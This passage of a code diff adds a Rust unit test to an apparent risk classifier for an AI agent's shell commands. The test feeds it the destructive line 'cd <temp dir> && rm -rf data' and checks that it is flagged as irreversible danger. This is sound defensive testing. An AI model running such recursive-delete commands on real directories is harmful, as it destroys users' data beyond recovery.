             StaticVerdict::NeedsJudge(ji) => assert!(ji.out_of_workspace, "{ji:?}"),
             other => panic!("expected the judge, got {other:?}"),
         }
+    }
+
+    #[test]
+    fn a_server_spawned_in_a_temp_directory_asks() {
+        let ws = tempfile::tempdir().unwrap();
+        let scratch = tempfile::Builder::new().tempdir_in("/tmp").unwrap();
+        let line = format!("cd {} && rm -rf data", scratch.path().display());
+        let site = CommandSite::Workspace(ws.path());
+        let StaticVerdict::NeedsJudge(ji) =
+            static_classify(tn::RUN_BASH, &json!({ "command": line }), site)
+        else {
+            panic!("expected the judge: {line}");
+        };
+        assert_eq!(
+            fallback_classify(&ji, site).lane,
+            RiskLane::IrreversibleDanger
+        );
     }
 
     #[test]
